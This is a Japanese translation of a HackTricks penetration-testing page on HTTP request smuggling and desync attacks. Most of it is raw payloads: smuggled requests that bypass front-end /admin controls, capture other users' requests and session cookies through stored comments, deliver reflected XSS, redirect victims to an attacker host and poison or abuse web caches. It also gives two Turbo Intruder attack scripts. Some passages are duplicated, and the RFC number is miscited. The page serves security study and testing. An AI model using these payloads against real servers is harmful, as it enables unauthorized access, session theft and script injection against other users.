# HTTPリクエストスミグリング/HTTPデシンク攻撃

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

## 概要

この脆弱性は、**フロントエンドプロキシ**と**バックエンド**サーバーの間の**非同期化**により、**攻撃者**がHTTPリクエストを**送信**できるようになります。このリクエストは、**フロントエンド**プロキシ（ロードバランス/リバースプロキシ）によって**単一のリクエスト**として**解釈**され、**バックエンド**サーバーによって**2つのリクエスト**として**解釈**されます。\
これにより、ユーザーは**自分の後に到着する次のリクエストを変更**することができます。

### 理論

[**RFC仕様（2161）**](https://tools.ietf.org/html/rfc2616)

> Transfer-EncodingヘッダーフィールドとContent-Lengthヘッダーフィールドの両方が含まれるメッセージが受信された場合、後者は無視される必要があります。

**Content-Length**

> Content-Lengthエンティティヘッダーは、受信者に送信されるエンティティボディのサイズ（バイト単位）を示します。

**Transfer-Encoding: chunked**

> Transfer-Encodingヘッダーは、ペイロードボディを安全にユーザーに転送するために使用されるエンコーディング形式を指定します。\
> Chunkedは、大きなデータがチャンクのシリーズで送信されることを意味します。

### 現実

**フロントエンド**（ロードバランス/リバースプロキシ）は**content-length**または**transfer-encoding**ヘッダーを処理し、**バックエンド**サーバーは**もう一方**を処理するため、2つのシステムの間で**非同期化**が発生します。\
これは非常に重大な問題です。なぜなら、**攻撃者はリバースプロキシに1つのリクエストを送信**でき、**バックエンド**サーバーは**2つの異なるリクエスト**として解釈するからです。この技術の危険性は、**バックエンド**サーバーが**注入された2番目のリクエスト**を次のクライアントからのリクエストとして**解釈**し、そのクライアントの**実際のリクエスト**が**注入されたリクエスト**の一部となる可能性があることにあります。

### 特異性

HTTPでは、**改行文字は2バイトで構成される**ことを覚えておいてください。

* **Content-Length**: このヘッダーは、リクエストのボディの**バイト数**を示す**10進数**を使用します。ボディは最後の文字で終わることが期待されており、リクエストの最後には**改行が必要ありません**。
* **Transfer-Encoding:** このヘッダーは、**次のチャンク**の**バイト数**を示す**16進数**を**ボディ**で使用します。**チャンク**は**改行で終わる**必要がありますが、この改行は**長さ指示子には含まれません**。この転送方法は、**サイズ0のチャンクの後に2つの改行が続くチャンクで終わる必要があります**：`0`
* **Connection**: 私の経験に基づいて、リクエストスミグリングの最初のリクエストでは**`Connection: keep-alive`**を使用することをお勧めします。

## 基本的な例

したがって、リクエストスミグリング攻撃は、`Content-Length`ヘッダーと`Transfer-Encoding`ヘッダーを単一のHTTPリクエストに配置し、これらを操作してフロントエンドとバックエンドのサーバーが異なる方法でリクエストを処理するようにします。これは、2つのサーバーの動作に依存します。

* **CL.TE**: フロントエンドサーバーは`Content-Length`ヘッダーを使用し、バックエンドサーバーは`Transfer-Encoding`ヘッダーを使用します。
* **TE.CL**: フロントエンドサーバーは`Transfer-Encoding`ヘッダーを使用し、バックエンドサーバーは`Content-Length`ヘッダーを使用します。
* **TE.TE**: フロントエンドとバックエンドのサーバーの両方が`Transfer-Encoding`ヘッダーをサポートしていますが、サーバーの1つはヘッダーを何らかの方法で隠蔽することで処理しないように誘導することができます。

### CL.TEの脆弱性

ここでは、**フロントエンド**サーバーが**`Content-Length`**ヘッダーを使用し、**バックエンド**サーバーが**`Transfer-Encoding`**ヘッダーを使用します。次のように、簡単なHTTPリクエストスミグリング攻撃を実行できます。

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

`Content-Length`は、リクエストのボディの長さが30バイト（HTTPでは改行ごとに2バイト）であることを示しています。したがって、リバースプロキシは完全なリクエストをバックエンドに送信し、バックエンドは`Transfer-Encoding`ヘッダーを処理して`GET /404 HTTP/1.1`を次のリクエストの**先頭**として処理します（ちなみに、次のリクエストは`Foo:x<次のリクエストはここから始まります>`に追加されます）。
### TE.CLの脆弱性

ここでは、フロントエンドサーバーが`Transfer-Encoding`ヘッダーを使用し、バックエンドサーバーが`Content-Length`ヘッダーを使用しています。次のようにして、簡単なHTTPリクエストスマグリング攻撃を実行することができます：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

この場合、**リバースプロキシ**は**`Transfer-Encoding`**が示すように、**リクエスト全体**を**バックエンド**に**送信**します。しかし、**バックエンド**は`Content-Length`で示されるように、**`7b`**（4バイト）のみを処理します。したがって、次のリクエストは`GET /404 HTTP/1.1`で始まるものになります。

_攻撃が`0`で終了する必要があることに注意してください。次のリクエストは、**x**パラメータの追加値として追加されます。_\
_また、埋め込まれたリクエストのContent-Lengthは、次のリクエストの長さを示します。それが小さすぎる場合、わずかなバイトが追加され、次のリクエストがエラーになります。_

### TE.TEの脆弱性

ここでは、フロントエンドとバックエンドの両方のサーバーが`Transfer-Encoding`ヘッダーをサポートしていますが、どちらかのサーバーがヘッダーを何らかの方法で処理しないように誘導することができます。\
`Transfer-Encoding`ヘッダーを曖昧化する方法は無限にあります。例えば：

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

**TE**ヘッダーの処理を**停止する**サーバー（リバースプロキシまたはバックエンド）によって、**CL.TEの脆弱性**または**TE.CLの脆弱性**が見つかります。

## HTTPリクエストスマグリングの発見

### タイミングテクニックを使用したCL.TEの脆弱性の発見

アプリケーションがCL.TEバリアントのリクエストスマグリングに脆弱である場合、次のようなリクエストを送信すると、しばしば時間の遅延が発生します：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
フロントエンドサーバーは`Content-Length`ヘッダーを使用するため、このリクエストの一部のみを転送し、`0`を省略します。バックエンドサーバーは`Transfer-Encoding`ヘッダーを使用し、最初のチャンクを処理した後、次のチャンクの到着を待ちます。これにより、観測可能な時間の遅延が発生します。

場合によっては、タイムアウトではなく、次のシナリオのように最終ホストから400 Bad Requestを受け取ることがあります。ここでは、CL.TEペイロードが送信されます。

![](<../../.gitbook/assets/image (444).png>)

そして、レスポンスはボディ内にエラーを含むリダイレクトであり、haproxyのバージョンさえ表示されます。

![](<../../.gitbook/assets/image (443).png>)

### タイミングテクニックを使用してTE.CLの脆弱性を見つける

アプリケーションがTE.CLバリアントのリクエストスミグリングに対して脆弱である場合、以下のようなリクエストを送信すると、しばしば時間の遅延が発生することがあります：
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### HTTPリクエストスマグリングの脆弱性の探索

**タイミングテクニックが機能している**ことがわかったら、他のクライアントのリクエストを変更できるかどうかを**探る**必要があります。\
これを行う最も簡単な方法は、自分自身のリクエストを毒化させることで、たとえば `/` へのリクエストを404に返すようにすることです。\
[基本的な例](./#basic-examples)では、`CL.TE` と `TE.CL` の例を見ました。これはクライアントのリクエストを毒化させ、 `/404` を要求するようにすることで、クライアントが他のリソースを要求しているときに404の応答を引き起こします。

**注意事項**

他のリクエストとの干渉によるリクエストスマグリングの脆弱性を確認しようとする際には、いくつかの重要な考慮事項を心に留めておく必要があります。

* "攻撃" リクエストと "通常" リクエストは、異なるネットワーク接続を使用してサーバーに送信する必要があります。同じ接続を介して両方のリクエストを送信すると、脆弱性が存在することを証明することはできません。
* "攻撃" リクエストと "通常" リクエストは、可能な限り同じURLとパラメータ名を使用する必要があります。これは、多くの現代のアプリケーションがURLとパラメータに基づいてフロントエンドリクエストを異なるバックエンドサーバーにルーティングするためです。同じURLとパラメータを使用することで、リクエストが同じバックエンドサーバーで処理される可能性が高まり、攻撃が機能するためには重要です。
* "通常" リクエストをテストして "攻撃" リクエストからの干渉を検出する際には、アプリケーションが同時に受信している他のリクエスト（他のユーザーからのリクエストを含む）と競合しています。 "通常" リクエストは "攻撃" リクエストの直後に送信する必要があります。アプリケーションがビジーな場合、脆弱性を確認するために複数の試行が必要になる場合があります。
* 一部のアプリケーションでは、フロントエンドサーバーがロードバランサーとして機能し、URLとパラメータに基づいて異なるバックエンドシステムにリクエストを転送します。 "攻撃" リクエストと "通常" リクエストが異なるバックエンドシステムに転送される場合、攻撃は失敗します。これは、脆弱性を確認するために何度か試行する必要がある追加の理由です。
* 攻撃が後続のリクエストに干渉することに成功した場合、これが干渉を検出するために送信した "通常" リクエストではなかった場合、他のアプリケーションユーザーが攻撃の影響を受けたことを意味します。テストを続ける場合、他のユーザーに混乱を引き起こす可能性がありますので、注意が必要です。

### ホップバイホップヘッダーを介した強制

ホップバイホップヘッダーを悪用することで、プロキシに対してヘッダー `Content-Length` または `Transfer-Encoding` を削除するよう指示し、HTTPリクエストスマグリングを悪用することができます。
```
Connection: Content-Length
```
詳細な情報については、以下を参照してください：

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTPリクエストスマグリングの悪用

### フロントエンドのセキュリティコントロールをバイパスするために

フロントエンドプロキシは、**セキュリティチェックを実行する場合があります**。HTTPリクエストスマグリングを悪用することで、これらのチェックを回避することができます。たとえば、この例では、外部から`/admin`にアクセスすることはできず、フロントエンドプロキシがそれをチェックしていますが、**埋め込まれたリクエストはチェックされていません**：

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### フロントエンドのリクエスト書き換えの特定 <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

多くのアプリケーションでは、**フロントエンドサーバーがリクエストを書き換え**てからバックエンドサーバーに転送します。通常、いくつかの追加のリクエストヘッダーを追加します。\
一般的なことは、リクエストにヘッダー`X-Forwarded-For: <クライアントのIP>`または類似のヘッダーを追加することです。これにより、バックエンドはクライアントのIPを知ることができます。\
時には、リクエストに追加される新しい値を見つけることができれば、保護を回避し、隠された情報/エンドポイントにアクセスすることができる場合があります。

プロキシがリクエストをどのように書き換えているかを発見するには、バックエンドがその値をレスポンスで反映するPOSTパラメータを見つける必要があります。その後、このパラメータを最後に使用し、次のようなエクスプロイトを使用します：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

この場合、次のリクエストは`search=`の後に追加されます。これはまた、**値が反映されるパラメータ**であり、したがって次のリクエストのヘッダーが反映されます。

注意点として、埋め込まれたリクエストの`Content-Length`ヘッダーで指定された長さのみが反映されることです。数が小さい場合、いくつかのバイトのみが反映されます。すべてのヘッダーの長さよりも大きな数を使用すると、埋め込まれたリクエストがエラーをスローします。そのため、**小さい数**から始めて、見たい内容がすべて表示されるまで数を**増やして**ください。\
また、このテクニックはTE.CLの脆弱性でも利用可能ですが、リクエストは`search=\r\n0`で終了する必要があります。ただし、改行文字に関係なく、値は検索パラメータに追加されます。

最後に、この攻撃では、フロントエンドプロキシがリクエストをどのように書き換えているかを学ぶために自分自身に攻撃していることに注意してください。

### 他のユーザーのリクエストのキャプチャ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

パラメータの内容を保存するPOSTリクエストを見つけることができれば、次のクライアントのリクエストを保存するために、そのパラメータの値として次のリクエストを追加することができます：

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

この場合、**パラメータcomment**の値は、ページに**公開されている投稿のコメント**に保存されます。したがって、**次のリクエストの内容が含まれたコメントが表示されます**。

_このテクニックの制限の1つは、通常、スマグリングされたリクエストに適用されるパラメータ区切り記号までのデータのみをキャプチャすることです。URLエンコードされたフォーム送信の場合、これは`&`文字になります。つまり、被害者ユーザーのリクエストから保存されるコンテンツは、最初の`&`で終わります。これはクエリ文字列にさえ表示される可能性があります。_

また、このテクニックはTE.CLの脆弱性でも利用可能ですが、リクエストは`search=\r\n0`で終了する必要があります。ただし、改行文字に関係なく、値は検索パラメータに追加されます。
### HTTPリクエストスミグリングを使用して反射型XSSを悪用する方法

ウェブページが**反射型XSSにも脆弱**である場合、HTTPリクエストスミグリングを悪用してウェブのクライアントを攻撃することができます。HTTPリクエストスミグリングからの反射型XSSの攻撃にはいくつかの利点があります。

* **被害者ユーザーとのやり取りは必要ありません**
* HTTPリクエストヘッダなど、通常の反射型XSS攻撃では**簡単に制御できないリクエストの一部**でXSSの振る舞いを悪用することができます。

もしウェブがUser-Agentヘッダに対して反射型XSSに脆弱である場合、以下のペイロードを使用して悪用することができます：

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### HTTPリクエストスミグリングを使用してオンサイトリダイレクトをオープンリダイレクトに変換する方法 <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

多くのアプリケーションは、リクエストの`Host`ヘッダからホスト名をリダイレクトURLに配置して、オンサイトリダイレクトを実行します。これはApacheやIISウェブサーバーのデフォルトの動作です。たとえば、末尾にスラッシュがないフォルダのリクエストは、同じフォルダにスラッシュを含めたリダイレクトを受け取ります：

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

この動作は通常無害とされていますが、リクエストスミグリング攻撃で他のユーザーを外部ドメインにリダイレクトすることができます。例えば：

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

スミグリングされたリクエストは、攻撃者のウェブサイトにリダイレクトをトリガーし、バックエンドサーバーで処理される次のユーザーのリクエストに影響を与えます。例えば：

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

ここでは、ユーザーのリクエストはウェブサイトのページでインポートされたJavaScriptファイルを要求しています。攻撃者は自分自身のJavaScriptをレスポンスに返すことで、被害者ユーザーを完全に侵害することができます。

### HTTPリクエストスミグリングを使用してウェブキャッシュの汚染を行う方法 <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

フロントエンドのインフラストラクチャの一部がコンテンツのキャッシュを実行している場合（通常はパフォーマンスのために）、サーバーのレスポンスを変更してキャッシュを汚染することができるかもしれません。

すでにサーバーからの期待される返される値を404に変更する方法を見てきました（[基本的な例](./#basic-examples)）。同様に、汚染されたリクエストが`/static/include.js`を要求している場合、サーバーは`/index.html`の内容を返すように変更することができます。これにより、`/static/include.js`の内容が`/index.html`の内容でキャッシュされ、クライアントから`/static/include.js`にアクセスできなくなります（DoS？）。

これは、**オープンリダイレクト**または**オンサイトリダイレクトからオープンリダイレクトへのリダイレクト**（前のセクション）を見つけた場合にさらに興味深いです。なぜなら、`/static/include.js`のキャッシュ値を自分が制御するスクリプトの値に**変更**することができるからです（`/static/include.js`の新しいバージョンをダウンロードしようとするすべてのクライアントに対して**一般的なXSS**を行うことができます）。

この例では、**キャッシュの汚染+オンサイトリダイレクトからオープンリダイレクト**を悪用して、`/static/include.js`のキャッシュの内容を攻撃者が制御するJSコードで提供する方法を示します：

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

埋め込まれたリクエストが`/post/next?postId=3`を要求していることに注意してください。このリクエストは`/post?postId=4`にリダイレクトされ、ドメインを示すために**Hostヘッダの値**を使用します。したがって、**Hostヘッダを変更**して攻撃者のサーバーを指すようにすると、リダイレクトはそのドメインを使用します（**オンサイトリダイレクトからオープンリダイレクト**）。

その後、ソケットを汚染した後、\*\*`/static/include.js`\*\*に対して**GETリクエスト**を送信する必要があります。このリクエストは**オンサイトリダイレクトからオープンリダイレクト**リクエストによって**汚染**され、攻撃者が制御するスクリプトの内容を取得します。

次回、誰かが`/static/include.js`を要求した場合、攻撃者のスクリプトのキャッシュされた内容が提供されます（一般的なXSS）。
### HTTPリクエストスマグリングを使用してウェブキャッシュの欺瞞を行う <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **ウェブキャッシュの毒入れとウェブキャッシュの欺瞞の違いは何ですか？**
>
> * **ウェブキャッシュの毒入れ**では、攻撃者はアプリケーションに悪意のあるコンテンツをキャッシュに保存し、このコンテンツがキャッシュから他のアプリケーションユーザーに提供されます。
> * **ウェブキャッシュの欺瞞**では、攻撃者はアプリケーションに別のユーザーの機密コンテンツをキャッシュに保存させ、その後、攻撃者はこのコンテンツをキャッシュから取得します。

このバリアントでは、攻撃者はユーザー固有の機密コンテンツを返すリクエストをスマグリングします。例えば:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

もし**ポイズンがキャッシュされる予定だった**`/someimage.png`のような**静的コンテンツにアクセスしていたクライアント**に到達した場合、被害者の`/private/messages`の内容が`/someimage.png`にキャッシュされ、攻撃者はそれを盗むことができます。\
攻撃者は**被害者がアクセスしようとしていた静的コンテンツを知らない**ため、おそらく最良の方法は攻撃を実行し、数秒待ってから**すべての**静的コンテンツを読み込み、**プライベートデータを検索する**ことです。

### HTTPレスポンスデシンクロナイゼーションを使用したHTTPリクエストスマグリングの武器化

HTTPリクエストスマグリングの脆弱性を見つけたけれども、どのように攻撃すればいいかわからない場合は、以下の攻撃手法を試してみてください:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo Intruderスクリプト

### CL.TE

[https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)から
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)

### TE.CL

元のURL: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## 詳細情報

![](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[ここからの画像](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## ツール

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): このツールは文法ベースのHTTP Fuzzerであり、奇妙なリクエストスマグリングの不一致を見つけるのに役立ちます。

## 参考文献

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
